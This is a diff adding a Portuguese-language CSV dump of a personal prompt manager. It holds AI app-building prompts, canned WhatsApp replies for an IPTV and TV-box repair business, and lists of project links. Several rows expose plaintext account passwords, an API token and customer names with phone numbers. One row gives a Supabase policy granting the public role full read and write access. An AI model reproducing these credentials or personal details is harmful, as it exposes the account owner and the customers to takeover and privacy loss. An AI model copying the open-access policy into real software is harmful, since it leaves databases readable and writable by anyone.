@@ -1,0 +1,1091 @@
+id,title,description,content,category,model,liked,author,user_id,created_at,updated_at
+1752001560934,Remover propaganda Lovable,Remover propaganda Lovable,"https://m3u-master-organizer-91-copia-3.lovable.app/  M3U Editor sem Propaganda
+
+----- raiz/index.html
+<head>
+    <meta charset=""UTF-8"" />
+    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
+    <title>M3U EDITOR v91</title>
+    <link rel=""icon"" href=""https://i.imgur.com/Gi1Iinr.png""> ----------------------------- Adicionado
+    <meta name=""description"" content=""Lovable Generated Project"" /> ---------------------- Editado
+    <meta name=""author"" content=""Lovable"" /> --------------------------------------------- Editado
+
+    <meta property=""og:title"" content=""m3u-master-organizer"" /> -------------------------- Editado
+    <meta property=""og:description"" content=""Lovable Generated Project"" /> --------------- Removido
+    <meta property=""og:type"" content=""website"" />
+    <meta property=""og:image"" content=""https://lovable.dev/opengraph-image-p98pqg.png"" />  Removido
+
+    <meta name=""twitter:card"" content=""summary_large_image"" />  -------------------------- Removido 
+    <meta name=""twitter:site"" content=""@lovable_dev"" />  --------------------------------- Removido
+    <meta name=""twitter:image"" content=""https://lovable.dev/opengraph-image-p98pqg.png"" /> Removido
+  </head>
+
+----- src/index.css
+
+/* Oculta completamente o selo da Lovable */
+a[href*=""lovable.dev""],
+iframe[src*=""lovable.dev""],
+div[style*=""Edit with Lovable""],
+.lovable-badge {
+  display: none !important;
+  opacity: 0 !important;
+  visibility: hidden !important;
+  pointer-events: none !important;
+  position: absolute !important;
+  z-index: -9999 !important;
+}
+
+Crie o vercel.json com as configurações de rotas para o deploy.
+
+Analise o código em busca de vulnerabilidades de segurança.",Programação,LOVABLE,false,USER,user_default,2025-07-08 19:06:00.934+00,2025-07-09 15:24:37.705618+00
+1752002034753,Ibo Player Pro,"💰 Investimento inicial: R$ 65,00","Olá! Para utilizar o serviço, será necessário
+
+📲 Aplicativo Ibo Player Pro
+Custo de R$ 30,00 por ano
+
+📡 Contratar uma lista M3U RTv
+Custo de R$ 35,00 por mês
+
+💰 Investimento inicial: R$ 65,00
+
+Se não quiser contratar o ""Ibo Player Pro"", pode utilizar o próprio player do servidor RTv, o Ibo Player Pro tem um carregamento mais rápido, um buffet de streaming melhor.",Tv-Box,CHATGPT,false,CHATGPT,user_default,2025-07-08 19:13:54.753+00,2025-07-09 15:24:37.705618+00
+1752002467885,"Bom dia, Tudo bem?","Infelizmente, não consigo te ajudar por WhatsApp. O valor do diagnóstico é R$ 25,00","Bom dia, Tudo bem?
+Infelizmente, não consigo te ajudar por WhatsApp nesse caso, pois é necessário realizar um diagnóstico completo no equipamento. O valor do diagnóstico é R$ 25,00 e, somente após essa análise, poderei te passar um orçamento preciso para o reparo ou serviço necessário.",Whatsapp,CHATGPT,false,CHATGPT,user_default,2025-07-08 19:21:07.885+00,2025-07-09 15:24:37.705618+00
+1752002593387,Inteligência Artificial,https://manus.im/,"Olá
+O que posso fazer por você?",Programação,CHATGPT,false,CHATGPT,user_default,2025-07-08 19:23:13.387+00,2025-07-09 15:24:37.705618+00
+1752002699738,Travamentos no sistema Android,"Com o tempo, o seu TV Box pode acumular muitas informações","*Olá! Tudo bem?*
+Com o tempo, o seu TV Box pode acumular muitas informações e isso pode causar travamentos no sistema Android.
+Recomendo que você acesse as *configurações do sistema*, entre na *pasta de aplicativos* e desinstale aqueles que *não utiliza mais*.
+Essa limpeza ajuda bastante no desempenho e melhora o funcionamento do seu equipamento.
+
+Se precisar de ajuda, estamos à disposição!",Tv-Box,CHATGPT,false,CHATGPT,user_default,2025-07-08 19:24:59.738+00,2025-07-09 15:24:37.705618+00
+1752002763457,Gerenciador de Tarefas,Email: profa.limoraes@gmail.com,"Link: https://app--tarefas-familia-moraes-7e2a935c.base44.app/
+
+Conta da Lílian - Notebook Dell
+Email: profa.limoraes@gmail.com",Projetos,BASE44,false,BASE44,user_default,2025-07-08 19:26:03.457+00,2025-07-09 15:24:37.705618+00
+1752002935031,Lista do Mercado,tekin2021conta,"Base44: https://app.base44.com/apps/68468adaeba78354ed9c9fbc
+
+Link: https://app--lista-de-compras-familia-moraes-ed9c9fbc.base44.app/",Projetos,BASE44,false,BASE44,user_default,2025-07-08 19:28:55.031+00,2025-07-09 15:24:37.705618+00
+1752002997790,Site Tekinformática,tekin2021conta4,"Site:  https://tekinfo.lovable.app/
+Lovable: https://lovable.dev/projects/32d13f7a-b874-4e4b-a21b-75f7c73124c4 original
+              https://lovable.dev/projects/9c0777f8-4a52-461f-bfda-2d6ce92083c5 tekinfo final
+Github:  https://github.com/tekin2021conta4/tekinfo final",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-08 19:29:57.79+00,2025-07-09 15:24:37.705618+00
+1752003056421,Gerenciador de Prompts,tekin2021conta2,"gerenciador-de-prompt - Login: tekin2021conta2@gmail.com Senha: nSob3KWGLeeITy
+Site: https://gerenciador-de-prompt.lovable.app
+Lovable: https://lovable.dev/projects/7c71727e-7e91-4f1f-a516-e92b9cfec6df
+Github: https://github.com/tekinf2026/gerenciador-de-prompt
+Supabase: https://supabase.com/dashboard/org/maswloasvmgyktkzrfyt
+Vercel: https://gerenciador-de-prompt-v1-87.vercel.app/ não vou mais usar",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-08 19:30:56.421+00,2025-07-09 15:24:37.705618+00
+1752003138397,Site Tekinformática,"Crie para mim um site moderno, responsivo e profissional","Você é um desenvolvedor web profissional. Crie para mim um site moderno, responsivo e profissional para a minha loja de informática chamada TEKINFORMÁTICA. Vou detalhar a seguir todas as partes que quero no site com base no design atual que preciso renovar. Use as informações abaixo como briefing completo.
+
+🔵 Sobre a empresa (use no rodapé e em seções institucionais)
+Nome: TEKINFORMÁTICA
+Slogan: Soluções tecnológicas para seu negócio
+Descrição institucional curta: Oferecendo produtos de alta qualidade e atendimento personalizado desde 2011.
+Missão: Descubra as melhores soluções em informática para seu negócio ou uso pessoal. Produtos de alta qualidade com preços competitivos.
+
+🎨 Estilo visual e cores
+Paleta primária em azul escuro (como #003366) e tons de azul claro para contraste
+
+Tipografia moderna e limpa, fácil de ler
+
+Layout em cards com cantos levemente arredondados
+
+Ícones e imagens de produtos com alta qualidade
+
+Design responsivo para desktop e mobile
+
+🏠 Página Inicial
+Hero section:
+
+Logo TEKINFORMÁTICA
+
+Título grande: Tecnologia de Ponta para Você
+
+Slogan/descrição curta: Descubra as melhores soluções em informática para seu negócio ou uso pessoal. Produtos de alta qualidade com preços competitivos.
+
+Dois botões com estilo moderno: Ver Produtos e Fale Conosco
+
+Seção: Produtos e Serviços em Destaque
+
+Título centralizado com destaque: Produtos e Serviços em Destaque
+
+Três cards com imagem e botão ""Saiba mais"":
+
+Computadores de Alta Performance
+
+Texto: Encontre o computador ideal para suas necessidades com as melhores condições de pagamento e hardware de confiança. Montamos configurações personalizadas para você.
+
+Formatação com backup e aplicativos
+
+Texto: Nosso serviço de formatação inclui backup completo dos seus arquivos pessoais, instalação de programas essenciais para o seu dia a dia e configuração personalizada do sistema.
+
+Android TV Box com Youtube, Netflix e Streaming
+
+Texto: Transforme sua TV em uma Smart TV com nossos dispositivos Android TV Box. Acesse streaming, jogos e aplicativos com facilidade e aproveite todo o conteúdo digital disponível.
+
+⭐ Seção de Depoimentos
+Título: Depoimentos
+Subtítulo: O que nossos clientes dizem sobre nós
+Cards com borda clara e sombra suave:
+
+Marcos Silva ⭐⭐⭐⭐⭐
+
+""Excelente atendimento! Meu computador estava muito lento e o Ricardo diagnosticou rapidamente o problema. Fez a formatação com backup de todos os meus arquivos e agora está funcionando perfeitamente. Recomendo a todos!""
+
+Ana Oliveira ⭐⭐⭐⭐⭐
+
+""Comprei um Android TV Box na Tekinformática e fiquei impressionada com a qualidade do produto e do atendimento. O Ricardo explicou detalhadamente como usar e configurou tudo para mim. Minha TV antiga agora parece nova!""
+
+Carlos Mendes ⭐⭐⭐⭐⭐
+
+""Montei meu PC gamer na Tekinformática e não poderia estar mais satisfeito! O Ricardo me ajudou a escolher os melhores componentes dentro do meu orçamento e o resultado foi incrível. Atendimento personalizado e preço justo!""
+
+📞 Rodapé
+Dividido em quatro colunas:
+
+Sobre a Tekinformática
+
+Logo
+
+Frase: Soluções tecnológicas para seu negócio
+
+Texto: Oferecendo produtos de alta qualidade e atendimento personalizado desde 2011.
+
+Links Rápidos
+
+Início
+
+Serviços
+
+Produtos
+
+Contato
+
+Categorias
+
+Computadores
+
+Monitores
+
+Armazenamento
+
+Memória RAM
+
+Contato
+
+Telefone/WhatsApp: (21) 97628-6027
+
+Email: tekin.formaticca@hotmail.com
+
+Ícones sociais para Instagram e Facebook
+
+🌐 Funcionalidades técnicas
+Layout responsivo para celular, tablet e desktop
+
+Formulário de contato funcional
+
+SEO básico com meta tags personalizadas
+
+Links rápidos no rodapé
+
+Código limpo e comentado
+
+✨ Observações extras
+Use imagens ilustrativas de alta qualidade para computadores gamers, notebooks sendo formatados e Android TV Box
+
+Mantenha o tom de voz amigável e profissional
+
+Adicione um efeito de hover suave nos botões e links
+
+Crie o site completo com base nesses requisitos.",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-08 19:32:18.397+00,2025-07-09 15:24:37.705618+00
+1752003212620,"Bom dia, Tudo bem? detalhe melhor o problema","Quando você diz que “o aplicativo não funciona"".","Bom dia, Tudo bem?
+
+Recebi sua mensagem, mas preciso que você me detalhe melhor o problema. Quando você diz que “o aplicativo não funciona”, o que exatamente está acontecendo? Ele não abre? Trava? Aparece alguma mensagem de erro?
+
+Se puder, envie um áudio explicando melhor a situação. Isso vai me ajudar a entender o que está ocorrendo.
+
+Também é importante verificar se sua internet está estável nesse horário. Às vezes, a conexão pode oscilar, especialmente à noite. Vale lembrar que o servidor que você está utilizando é o mesmo que eu uso na minha residência, e até o momento, não recebi outras reclamações de instabilidade à noite.
+
+Se o problema acontecer novamente, recomendo seguir esse passo a passo:
+
+1. Desligue o roteador da internet da tomada.
+
+2. Desligue também sua televisão da tomada.
+
+3. Aguarde cerca de 1 minuto.
+
+4. Ligue primeiro o roteador e espere até que todas as luzes estejam acesas.
+
+5. Em seguida, ligue a TV e faça o teste novamente.
+
+Fico no aguardo do seu retorno com mais informações para que eu possa te ajudar da melhor forma. ",Whatsapp,CHATGPT,false,CHATGPT,user_default,2025-07-08 19:33:32.62+00,2025-07-09 15:24:37.705618+00
+1752003264859,Analise as imagens,Faça as devidas correções que foram demarcada na imagem,"Faça as devidas correções que foram demarcada na imagem, alterações de melhorias na interfece gráfica.",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-08 19:34:24.859+00,2025-07-09 15:24:37.705618+00
+1752003369563,Corrigir o erro de data que mostra 1 dia a menos,Garantir que a data exibida na tabela e no formulário corresponda exatamente à data armazenada.,"⚙️ Corrigir o erro de data que mostra 1 dia a menos:
+   - Garantir que a data exibida na tabela e no formulário corresponda exatamente à data armazenada.
+   - Verificar e ajustar o uso de fuso horário (timezone), evitando subtrações automáticas de 1 dia.",Programação,LOVABLE,false,LOVABLE,user_default,2025-07-08 19:36:09.563+00,2025-07-09 15:24:37.705618+00
+1752003434770,Analisa essas imagens e crie um prompt,"Crie prompt completo detalhando todo o meu projeto para ser inserido na ""IA Lovable""","Por favor, analise essas imagens é de um aplicativo web de ""Gerenciador Financeiro"", preciso que crie um prompt um comando completo detalhando todo o meu projeto para ser inserido na ""IA Lovable"" para que ela refaça este projeto inteiro, vou utilizar um banco de dados no ""Supabase"".
+
+Irei iniciar o projeto salvando os dados no ""LocalStorage"" mais o projeto já deve ser criado para hospedar os dados no ""Supabase"".",Programação,CHATGPT,false,CHATGPT,user_default,2025-07-08 19:37:14.77+00,2025-07-09 15:24:37.705618+00
+1752003506698,"Supabase, faça a conexão com o sistema","Minha conta no ""Supabase"" está conectada","Minha conta ""Supabase"" está conectada a este projeto, preciso que remova o armazenamento ""LocalStorage"" e crie a tabela ""lancamentos"" e as colunas necessárias para o armazenamento dos dados no ""Supabase"".
+
+Migre os dados existente ná página ""Lançamentos"" para o novo banco de dados e faça a conexão do sistema com o banco de dados ""Supabase""
+
+",Programação,SUPABASE,false,SUPABASE,user_default,2025-07-08 19:38:26.698+00,2025-07-09 15:24:37.705618+00
+1752008696752,Gerenciador de Prompts,"✅ Sistema completo de CRUD para prompts, categorias e modelos","https://hatchcanvas.com/public/proj_4mGPHLCxrm0F5CF4WbM1p/shape:lG8u_O4MN71_pFxRzpwYO
+
+🏆 O que conseguimos criar:
+💼 Funcionalidades Profissionais:
+✅ Sistema completo de CRUD para prompts, categorias e modelos
+✅ Filtros avançados por categoria, modelo e favoritos
+✅ Busca inteligente em tempo real
+✅ Ordenação múltipla (recentes, antigos, alfabética)
+✅ Sistema de favoritos com persistência
+✅ Edição inline na sidebar com dropdowns
+🎨 Design Elegante:
+✅ Interface dark theme moderna e profissional
+✅ Sistema de cores dinâmico para categorias e modelos
+✅ Gradientes e sombras sutis para profundidade
+✅ Responsividade completa para todos os dispositivos
+✅ Animações suaves e transições fluidas
+🚀 Tecnologia de Ponta:
+✅ React 19 com hooks otimizados
+✅ Persistência local com useStoredState
+✅ Tailwind CSS para estilização
+✅ Lucide React para ícones consistentes
+✅ Arquitetura modular e escalável
+📱 Experiência do Usuário:
+✅ Interface intuitiva e fácil de navegar
+✅ Feedback visual em todas as ações
+✅ Confirmações de segurança para exclusões
+✅ Mobile-first design responsivo",Projetos,HATCH.CANVAS,false,HATCH.CANVAS,user_default,2025-07-08 21:04:56.752+00,2025-07-09 15:24:37.705618+00
+1752008696753,Você é analista de código profissional,Analise este projeto e verifique opções de melhorias e correções de erros https://hatchcanvas.com/,"Você é analista de código profissional, analise este projeto e verifique opções de melhorias e correções de erros, preciso de todas as informações de tipos de códigos e até banco de dados utilizada na criação deste projeto.",Projetos,HATCH.CANVAS,false,HATCH.CANVAS,user_default,2025-07-05 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752008696754,cartao-de-credito-recebeiveis-98,tekin2021conta,"Lovable: https://lovable.dev/projects/b0b81130-7c12-49cd-9692-40c61133f0b0
+Site: https://cartao-de-credito-recebiveis-98.lovable.app/
+Github: https://github.com/tekin2021conta/cartao-de-credito-recebiveis-98
+Supabase:  jawir55748@iridales.com - CK6uMmXUGsALj7JW@
+Nome do projeto: cartao-de-credito-&-controle-financeiro - Senha: K6uMmXUGsALj7JW@
+Supabase: https://supabase.com/dashboard/project/gmebjcriqpfibrtqyfyl - Acessar com Github
+Vercel: https://cartao-de-credito-recebiveis-98.vercel.app/",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-03 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752008696755,controle-financeiro,tekin.formatica@hotmail.com,"Lovable: 
+Site: 
+Github: https://github.com/tekinf2025/controle-financeiro-v7-20
+Supabase:  jawir55748@iridales.com - CK6uMmXUGsALj7JW@
+Nome do projeto: cartao-de-credito-&-controle-financeiro - Senha: K6uMmXUGsALj7JW@
+Supabase:  jawir55748@iridales.com - CK6uMmXUGsALj7JW@
+Vercel: https://vercel.com/tekinfos-projects/controle-financeiro-v7-20 
+https://controle-financeiro-v7-20.vercel.app/",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-03 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752008696757,Investimentos 2025,Tecnologias e Arquitetura Utilizadas,"https://tekinf2025.github.io/investimentos2025/
+https://hatchcanvas.com/project/proj_Z3PEVw5gYPI9Js2hm74hG
+https://hatchcanvas.com/public/proj_Z3PEVw5gYPI9Js2hm74hG/shape:s8-fAqW_HNt46tJtNCxe1
+Supabase:  jawir55748@iridales.com - CK6uMmXUGsALj7JW@
+Nome do projeto: cartao-de-credito-&-controle-financeiro - Senha: K6uMmXUGsALj7JW@
+
+const url = `https://brapi.dev/api/quote/${symbol}?token=${token}`;
+const token = 'sb9Cd84Y9hW5eRharMMRuD';
+
+📊 Tecnologias e Arquitetura Utilizadas
+Frontend:
+React 19.0.0 com Hooks (useState, useEffect)
+Tailwind CSS para estilização
+Lucide React para ícones
+JavaScript/JSX (ES6+)
+Armazenamento de Dados:
+LocalStorage do navegador (através do hook useStoredState do Hatch)
+Não utiliza banco de dados tradicional - todos os dados são persistidos localmente
+APIs Externas:
+brapi.dev API para cotações da B3 (Bolsa de Valores)
+Fetch API nativa para requisições HTTP
+Plataforma:
+Hatch Canvas Environment (ambiente específico da plataforma)",Projetos,HATCH.CANVAS,false,HATCH.CANVAS,user_default,2025-07-08 11:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752008696758,"A sessão ""Saldos Bancários"" a edição dos valores está ruim",pode melhorar significativamente a experiência de digitação dos valores,"A sessão ""Saldos Bancários"" a edição dos valores está ruim, pode melhorar significativamente a experiência de digitação dos valores com as seguintes mudanças:
+
+* Formatação automática: Os valores são formatados automaticamente conforme você digita (ex: 12345 vira 123,45)
+* Símbolo R$ fixo: Adicionei um prefixo R$ que não interfere na digitação
+* Input mais largo: Aumentei a largura do campo para melhor visualização
+* Placeholder: Adicionei um placeholder ""0,00"" para orientar o usuário
+* Melhor parsing: Lógica mais robusta para converter entre formato visual e numérico
+* Hover effects: Botões com efeitos visuais mais sutis e profissionais",Programação,LOVABLE,false,LOVABLE,user_default,2025-07-05 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752008696759,sistema-de-vendas-v6,tekin2021conta5,"Login: tekin2021conta5@gmail.com - nSob3KWGLeeITy
+Site: https://sistema-de-vendas-v6.lovable.app/
+Lovable: https://lovable.dev/projects/78407bb7-e96b-4034-b385-74b487b0ddd4
+Github: https://github.com/tekin2021conta5/sistema-de-vendas-v6
+Supabase: https://supabase.com/dashboard/org/kmjxdzyfddetvwekfsnt
+Vercel: https://sistema-de-vendas-v6.vercel.app/",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-03 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+175200869676,Erro no servidor,Conteúdos errado ou faltando,"Agradeço por avisar. Vou encaminhar a informação para a equipe de suporte técnico, que irá verificar e resolver o quanto antes.",Whatsapp,CHATGPT,false,CHATGPT,user_default,2025-07-03 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752008696760,Supabase liberar acesso ao BD,Política de acesso,"-- Política para permição total clientes
+
+Policy Name: ""clientes-acesso"" 
+
+Table on clause: ""public.clientes""
+
+Policy Command: ""ALL"" 
+
+Target Roles: ""public""
+
+using: ""true""
+
+with check: ""true""",Programação,LOVABLE,false,SUPABASE,user_default,2025-07-03 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752008696761,Tabela de Jogos,tekinformatica2013,"Site: https://tekinf2025.github.io/jogosdodia/
+https://hatchcanvas.com
+https://hatchcanvas.com/public/proj_o_5bG1olXNEhYo1PFEKKD/shape:fm4CgohGj9JRYq1XId2cz",Projetos,HATCH.CANVAS,false,HATCH.CANVAS,user_default,2025-07-05 18:12:35.471+00,2025-07-09 15:24:37.705618+00
+1752074434356,Analise essa Imagem,"Gerar comandos para que possa pedir a ""IA Lovable""","Pode analisar essa imagem por favor é de uma aplicação web para ""gerenciamento de despesas pessoais"", preciso que me ajude gerando comandos para que possa pedir a ""IA Lovable"" executar e corrigir, importante sempre abaixo de cada comando inserir a mensagem abaixo.
+
+❗ Não alterar nada no design visual (cores, ícones, fontes ou botões), por favor, altere somente o que foi pedido acima.",Programação,CHATGPT,false,CHATGPT,user_default,2025-07-09 15:20:34.356+00,2025-07-09 15:24:37.705618+00
+1752074656226,gerenciador-de-clientes-navy,tekin.formatica@hotmail.com tekin.cliente2024@gmail.com,"Site: https://gerenciador-de-clientes.lovable.app/
+Lovable: Acessa com Github - https://lovable.dev/projects/b936dc17-8637-4afa-8a19-708e003ae2df 
+Github: tekin.formatica@hotmail.com - https://github.com/tekinf2025/gerenciador-de-clientes
+Supabase: Acessa com Github - https://supabase.com/dashboard/project/ivumtyhdkjurerknjnpt
+Vercel: tekin.cliente2024@gmail.com - https://gerenciador-de-clientes-navy.vercel.app/
+
+Gerenciador de clientes Lovable + Supabase + Github + Vercel
+
+🎨 Tema Geral:
+Tema: Dark Mode
+
+Fundo principal -  #121212 (ou tonalidade escura similar)
+
+Tipografia texto primário em branco (#FFFFFF) ou ciano claro (#5DF0FF) para destacar
+
+UI Geral: botões com cores contrastantes e ícones bem visíveis no modo escuro — por exemplo, verde vibrante, azul claro, vermelho, seguindo sua identidade visual
+
+📊 1. Dashboard:
+Prompt para design e implementação
+Crie um layout de Dashboard em Dark Mode (fundo #121212), com cabeçalho fixo contendo nome do usuário ou logo em ciano claro.  
+Mostre cards/resumos com estatísticas (Total de Clientes, Atividades, Faturamento) em blocos com cantos arredondados, fundo #1E1E1E e texto em branco/ciano.  
+Inclua gráficos simples (pizza, linhas) usando cores vibrantes contrastantes (verde, azul claro, vermelho).  
+Adicione barra lateral escura (#1B1B1B) com ícones em ciano ou branco, itens: Dashboard, Clientes, Configurações, Logout.  
+Botões principais: “Adicionar”, “Exportar”, “Filtrar” com bordas/cor de fundo em verde (#1BC000) ou azul claro (#00AEEF), ícones nítidos.
+Inclua uma widget com atalhos rápidos (ex: criar novo cliente, ver notificações) e um toggle para alternar entre Dark/Light mode (embora o foco seja o Dark).
+
+🧑‍🤝‍🧑 2. Página Clientes:
+Prompt para design e implementação
+Crie a página de Clientes em Dark Mode (#121212).  
+Topo: barra de pesquisa centralizada com ícone de lupa, placeholder em ciano claro.  
+Logo abaixo, botão “+ Novo Cliente” destacado em verde (#1BC000) com ícone “+”, e botão de filtro/ordenar em azul claro (#00AEEF).  
+Tabela de clientes: fundo da tabela #1E1E1E, linhas em cinza escuro alternadas. Texto branco/ciano.  
+Ícones de ação (editar, excluir, visualizar) ao final de cada linha, em vermelho para excluir, azul para editar e branco para visualizar.  
+Paginação discreta em rodapé com botões de página maiores em ciano claro.
+Adicionar modo de seleção em massa com checkboxes e ações rápidas (ex: enviar whatsapp, exportar).
+
+⚙️ 3. Página Configurações:
+Prompt para design e implementação
+Crie a página de Configurações em Dark Mode (#121212).  
+Menu lateral (ou abas no topo): Perfil, Preferências, Notificações, Segurança.  
+Cada seção com cards ou seções horizontais com fundo #1E1E1E, cabeçalhos em ciano claro e conteúdo em branco.  
+Campos de texto/dados: fundo #2A2A2A, texto branco, borda sutil ciano ao focar.  
+Switches (toggle buttons) para preferências como “Receber notificações”, “Modo escuro” (ativado por padrão) com cores vibrantes ao ativar.  
+Botões de ação: “Salvar Alterações” em verde vibrante, “Cancelar” em vermelho suave.  
+Inclua tooltips (ícones “?” em branco) explicando cada configuração, visíveis em hover.
+Adicione um componente de confirmação (modal) ao salvar configurações críticas como alteração de senha ou modo de pagamento.
+
+🔧 4. Funcionalidades Principais:
+Dashboard moderno com gráficos
+
+* Clientes ativos
+
+* Clientes vencidos
+
+* Receita estimada
+
+* Fidelidade e churn
+
+5. Controle de vencimentos:
+
+* Identificação automática de clientes vencidos ou próximos 5 dias do vencimento
+
+* Cálculo de dias restantes, data_vencimento calculado pelo dia atual
+
+* Cálculo de dias cliente ativo, conta_criada calculado pelo dia atual
+
+* Status Ativo / Vencido::
+🧑‍🤝‍🧑 Cálculo de custo por servidor, este parametro precisa ser editável
+
+  * P2X → R$ 6,00
+
+  * P2_SERVER → R$ 10,00
+
+  * CPLAYER → R$ 8,00
+
+  * RTV → R$ 8,00
+
+  * RTV-VODs → R$ 0,00
+
+6. Gestão completa de clientes com:
+
+* Cadastro, edição e exclusão
+
+* Filtros avançados por nome, status, servidor e data de vencimento
+
+* Ordenação por vencimento (de A-Z e Z-A)
+
+📄7 Sistema de Notificações via WhatsApp:
+
+* Botão WhatsApp em todas as seções de cliente
+
+* Mensagem configurável centralmente
+
+* Envio automático com dados personalizados do cliente, servidor, plano_mensal, plano_trimestral
+📄 Importação e Exportação de arquivo CSV:
+
+* Estrutura do CSV
+""id_client"",""nome"",""telefone"",""servidor"",""plano_mensal"",""plano_trimestral"",""data_vencimento"",""status"",""conta_criada"",""observacao""
+""CLI-100002"",""Marcelino Gomes"",""5521982271401"",""P2_SERVER"",""35"",""90"",""2025-05-10"",""Vencido"",""2023-03-18"",""""
+""CLI-100003"",""Angelo Lisboa"",""5521993451684"",""P2X"",""30"",""75"",""2025-05-28"",""Vencido"",""2021-01-04"",""""
+
+✅ Dicas Extras de UI/UX:
+Contraste: verifique legibilidade com o fundo escuro. Utilize ferramentas como WCAG contrast checker.
+
+Interatividade: animações suaves (hover, clique nos botões) bem sutis, com feedback visual.
+
+Consistência: mantenha espaçamentos e tipografia uniforme nas páginas.
+
+Acessibilidade: garanta foco visível (outline ciano) e navegabilidade por teclado.
+
+Defina tema Dark globalmente (#121212).
+
+Crie seções com containers escuros (#1B1B1B / #1E1E1E).
+
+Configure componentes de texto com estilo em branco/ciano.
+
+Utilize blocos “Botão” para ações, definindo cor de fundo personalizada.
+
+Para gráficos, use integração com components gráficos e escolha paleta vibrante (verde, azul, vermelho).
+
+Adicione ícones SVG compatíveis com o Dark Mode (tamanho e cor ajustados).
+
+",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-09 15:24:16.226+00,2025-07-09 15:24:37.705618+00
+1752075787068,M3U Editor,tekin2021conta1,"Site: https://m3u-editor.lovable.app/
+Github:  https://github.com/tekin2021conta1/m3u-editor
+Lovable: https://lovable.dev/projects/92277010-a60e-4c4f-86ef-f43d3df5b5ac
+
+Título do Projeto:
+Gerenciador de Lista M3U (Editor M3U v2)
+
+Objetivo:
+Desenvolver uma aplicação web SPA (Single Page Application) para gerenciar, editar e exportar listas M3U personalizadas. A aplicação não deve usar banco de dados. Todo o armazenamento e persistência de dados devem ser feitos via cache no navegador (LocalStorage).
+
+🧩 Funcionalidades principais:
+Importação de Lista M3U
+
+Botão “Importar M3U”.
+
+Ao importar, o sistema lê o conteúdo do arquivo e transforma cada entrada em um item de lista com:
+
+Nome
+
+URL
+
+Grupo
+
+Logo (tvg-logo)
+
+Os dados devem ser armazenados no LocalStorage.
+
+Filtros e Ordenação
+
+Campo de busca por nome do canal.
+
+Filtro por grupo (dropdown).
+
+Botões para ordenar de A-Z e Z-A pelo nome.
+
+Listagem de Canais
+
+Checkbox para seleção individual e em massa dos canais.
+
+Colunas: Logo, Nome, URL, Grupo, Ações.
+
+Agrupar por categoria de grupo.
+
+Mostrar total de canais e número de canais selecionados.
+
+Ações em Massa
+
+Botões:
+
+Editar (múltiplos canais)
+
+Copiar
+
+Exportar (M3U)
+
+Excluir
+
+Limpar tudo (reseta o LocalStorage)
+
+Editor de Canais Selecionados
+
+Modal com os campos:
+
+Alterar Grupo
+
+Alterar URL do logo
+
+Substituir parte da URL:
+
+Texto original
+
+Novo texto
+
+Alterar URL completa (opcional)
+
+Exportação M3U
+
+Geração e pré-visualização do conteúdo M3U com estrutura padrão:
+
+vbnet
+Copiar
+Editar
+#EXTINF:-1 group-title=""Grupo"" tvg-logo=""URL do logo"", Nome do Canal
+URL do stream
+Opções: Copiar para área de transferência ou Baixar como arquivo .m3u.
+
+Interface do Usuário
+
+Layout escuro moderno e responsivo.
+
+UI intuitiva com feedback visual (mensagens, animações leves, ícones).
+
+Tooltips nos botões.
+
+🔒 Requisitos Técnicos
+Armazenamento: Exclusivamente via window.localStorage:
+
+Chave: ""listaCanaisM3U""
+
+Salvar automaticamente a cada alteração.
+
+Tecnologias sugeridas: HTML5, CSS3 (ou Tailwind), JavaScript puro ou framework leve (opcional: Vue.js/React).
+
+Não utilizar back-end ou banco de dados.
+
+Exportação de arquivo .m3u: Deve gerar um Blob e permitir download com URL.createObjectURL().
+
+📌 Recursos opcionais (desejáveis):
+Drag and drop para reordenar canais.
+
+Confirmação antes de limpar tudo.
+
+Suporte à importação arrastando o arquivo .m3u.
+
+Contador de canais total e filtrado.
+
+Mensagens de alerta e status (ex: “15 canais selecionados”).
+
+🎯 Meta
+Um painel funcional, leve e offline para criar, organizar e exportar listas M3U, ideal para uso pessoal e rápido, sem necessidade de servidor.",Projetos,LOVABLE,false,LOVABLE,user_default,2025-07-09 15:43:07.068+00,2025-07-09 15:43:07.477229+00
+1752076487051,"No momento, não realizo serviço",Bom dia! Agradeço muito pelo seu contato.,"Bom dia!
+Agradeço muito pelo seu contato. No momento, não realizo este serviço nem comercializo este produto. Fico à disposição para ajudar em outras necessidades.
+
+Tenha um ótimo dia!",Whatsapp,CHATGPT,false,CHATGPT,user_default,2025-07-09 15:54:47.051+00,2025-07-09 15:54:47.28994+00
+1752076544293,Cancelamento de serviço,Agradeço sinceramente pela confiança,"Prezado Cliente,
+
+Agradeço sinceramente pela confiança depositada em nossos serviços durante todo o período em que trabalhamos juntos.
+
+Recebi sua solicitação de cancelamento e compreendo sua decisão. Me coloco à disposição para qualquer necessidade durante o processo de encerramento.
+
+Foi um prazer tê-lo como cliente.
+
+Atenciosamente,
+[Ricardo - Tekinformática]",Whatsapp,CHATGPT,false,CHATGPT,user_default,2025-07-09 15:55:44.293+00,2025-07-09 15:55:44.673697+00
+1752076575617,Smartone IPTV,Instalar o aplicativo SmartONE IPTV,"Olá! Para utilizar o serviço, será necessário
+
+📲 Instalar o aplicativo SmartONE IPTV
+Custo de R$ 35,00 por ano
+
+📡 Contratar uma lista M3u RTv
+Custo de R$ 35,00 por mês
+
+💰 Investimento inicial: R$ 70,00
+
+Estou à disposição, se precisar!
+
+Vídeo de como instalar o Smartone IPTV
+https://youtu.be/iqcft8AZ4SM",Tv-Box,CHATGPT,false,CHATGPT,user_default,2025-07-09 15:56:15.617+00,2025-07-09 15:56:15.807173+00
+1752076609609,temp-mail.org,Email temporários,"Site da Loja Final - https://lovable.dev/projects/32d13f7a-b874-4e4b-a21b-75f7c73124c4
+
+Gerenciador de Prompt v1 - https://lovable.dev/projects/74868fbf-8694-414c-954b-d491e5db54aa - fase 1
